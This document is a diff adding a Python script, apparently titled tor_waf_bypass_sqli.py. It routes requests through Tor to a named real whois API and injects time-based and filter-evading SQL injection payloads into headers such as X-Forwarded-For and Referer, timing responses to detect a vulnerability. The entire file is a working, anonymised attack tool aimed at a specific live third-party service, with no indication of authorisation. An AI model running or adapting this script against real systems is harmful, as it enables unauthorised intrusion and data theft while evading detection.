@@ -1,0 +1,71 @@
+script name (tor_waf_bypass_sqli.py)
+
+Python script
+import requests
+import time
+import random
+import urllib.parse
+
+# Tor proxy settings
+proxies = {
+    "http": "socks5h://127.0.0.1:9050",
+    "https": "socks5h://127.0.0.1:9050"
+}
+
+# Target API endpoint
+target_url = "https://webwhois.verisign.com/webwhois-ui/rest/whois"
+base_params = {
+    "q": "verisign.com",
+    "tld": "com",
+    "type": "domain"
+}
+
+payloads = [
+    "'||SLEEP(5)--",
+    "' OR 1=1--",
+    "'/**/oR/**/'1'='1",
+    "'/*!50000OR*/'1'='1'--",
+    "' OR IF(1=1, SLEEP(5), 0)--+"
+]
+
+headers_to_test = [
+    "X-Remote-IP", "X-Originating-IP", "X-Forwarded-For",
+    "X-Client-IP", "X-Remote-IP", "Referer", "User-Agent"
+]
+
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (X11; Linux x86_64)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+]
+
+def test_payload(payload):
+    for header_name in headers_to_test:
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "X-Requested-With": "XMLHttpRequest"
+        }
+        headers[header_name] = payload
+
+        try:
+            print(f"[+] Testing {header_name}: {payload}")
+            start = time.time()
+            response = requests.get(target_url, headers=headers, params=base_params, proxies=proxies, timeout=15)
+            end = time.time()
+            duration = end - start
+
+            print(f"    [Status] {response.status_code}")
+            print(f"    [Time]   {duration:.2f}s")
+            if duration > 5:
+                print(f"    🚨 Possible time-based SQLi via {header_name}!")
+
+        except Exception as e:
+            print(f"    [ERROR] Request failed: {e}")
+        time.sleep(4)
+
+# Run all payloads
+for p in payloads:
+    test_payload(p)
+
+
+
